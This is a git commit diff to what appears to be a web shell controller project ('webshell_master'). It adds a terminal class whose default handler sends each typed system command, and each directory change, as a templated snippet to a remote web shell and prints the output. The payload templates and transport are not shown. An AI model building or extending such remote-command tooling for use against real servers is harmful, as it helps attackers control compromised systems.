deb7639247599eb895ec7aeabe71cf9339a469ce
Ido Avrech <ido05469@gmail.com>
2021-09-16 02:17:08 +0300

    added working cd and commands

--- shell_context/shell_terminal.py
+++ shell_context/shell_terminal.py
@@ -6,6 +6,8 @@
 
 import cmd2
 from webshell_master_cmd import WebshellCmd
+from snippets.snippet_handler import get_snippet
+from communication import send_snippet
 
 
 class ShellTerminal(WebshellCmd):
@@ -15,7 +17,17 @@ class ShellTerminal(WebshellCmd):
 
     def __init__(self):
         super(WebshellCmd, self).__init__()
-        self.prompt = "shell> "
+        self.cwd = "."
+        self.prompt = ".> "
+        self.do_cd(cmd2.Statement("."))
 
     def default(self, statement: cmd2.Statement):
-        pass
+        snippet = get_snippet("system_command.snippet",
+                              {"CURRENT_DIRECTORY": self.cwd, "SYSTEM_COMMAND": statement.raw})
+        print(send_snippet(snippet))
+
+    def do_cd(self, statement: cmd2.Statement):
+        snippet = get_snippet("directory_change.snippet",
+                              {"OLD_DIRECTORY": self.cwd, "DIRECTORY_CHANGE": statement.args})
+        self.cwd = send_snippet(snippet)
+        self.prompt = self.cwd + "> "
